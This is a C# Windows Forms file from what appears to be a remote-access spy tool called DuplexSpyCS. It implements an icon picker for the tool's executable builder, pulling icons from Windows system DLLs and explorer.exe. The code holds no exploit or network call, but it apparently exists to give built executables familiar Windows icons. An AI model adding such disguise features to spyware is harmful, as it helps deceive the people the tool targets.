using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.Entity.Core.Metadata.Edm;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmBuildIconPicker : Form
    {
        public Image exe_icon;

        private string[] DllPaths = new string[]
        {
            @"C:\Windows\System32\shell32.dll",
            @"C:\Windows\System32\user32.dll",
            @"C:\Windows\System32\imageres.dll",
            @"C:\Windows\System32\dmdlgs.dll",
            @"C:\Windows\System32\compstui.dll",
            @"C:\Windows\System32\pifmgr.dll",
            @"C:\Windows\explorer.exe",
        };

        [DllImport("shell32.dll", CharSet = CharSet.Auto)]
        private static extern int ExtractIconEx(string lpszFile, int nIconIndex, IntPtr[] phiconLarge, IntPtr[] phiconSmall, int nIcons);

        public frmBuildIconPicker()
        {
            InitializeComponent();
        }

        void ExtractIcon()
        {
            try
            {
                foreach (string szDLLname in DllPaths)
                {
                    Invoke(new Action(() => toolStripStatusLabel1.Text = $"Loading from: {szDLLname}"));

                    string dllPath = szDLLname;

                    if (!File.Exists(dllPath))
                    {
                        MessageBox.Show("File not found:\n" + dllPath, "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        continue;
                    }

                    int iconCount = ExtractIconEx(dllPath, -1, null, null, 0); // Get total icon count

                    IntPtr[] largeIcons = new IntPtr[iconCount];
                    IntPtr[] smallIcons = new IntPtr[iconCount];

                    ExtractIconEx(dllPath, 0, largeIcons, smallIcons, iconCount);

                    for (int i = 0; i < iconCount; i++)
                    {
                        if (largeIcons[i] != IntPtr.Zero)
                        {
                            using (Icon icon = Icon.FromHandle(largeIcons[i]))
                            {
                                Invoke(new Action(() => imageList1.Images.Add(icon)));

                                ListViewItem item = new ListViewItem(string.Empty);
                                item.ImageIndex = i;
                                item.Tag = i;

                                Invoke(new Action(() => listView1.Items.Add(item)));
                            }
                        }
                    }
                }

                Invoke(new Action(() => toolStripStatusLabel1.Text = $"Action successfully, Icon[{listView1.Items.Count}]"));
            }
            catch
            {

            }
        }

        void setup()
        {
            toolStripStatusLabel1.Text = "Loading...";
            new Thread(() => ExtractIcon()).Start();
        }

        private void frmBuildIconPicker_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Other - Select icon from local
        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = false;
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                if (File.Exists(ofd.FileName))
                {
                    try
                    {
                        Image img = Image.FromFile(ofd.FileName);
                        pictureBox1.Image = img;
                    }
                    catch (Exception ex) //Convert into image failed.
                    {
                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        C2.sql_conn.WriteSysErrorLogs(ex.Message);
                    }
                }
            }
        }
        //OK
        private void button2_Click(object sender, EventArgs e)
        {
            exe_icon = pictureBox1.Image;
            Close();
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                int idx = (int)listView1.SelectedItems[0].Tag;
                pictureBox1.Image = imageList1.Images[idx];
            }
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Build\\IconPicker").Show();
        }
    }
}
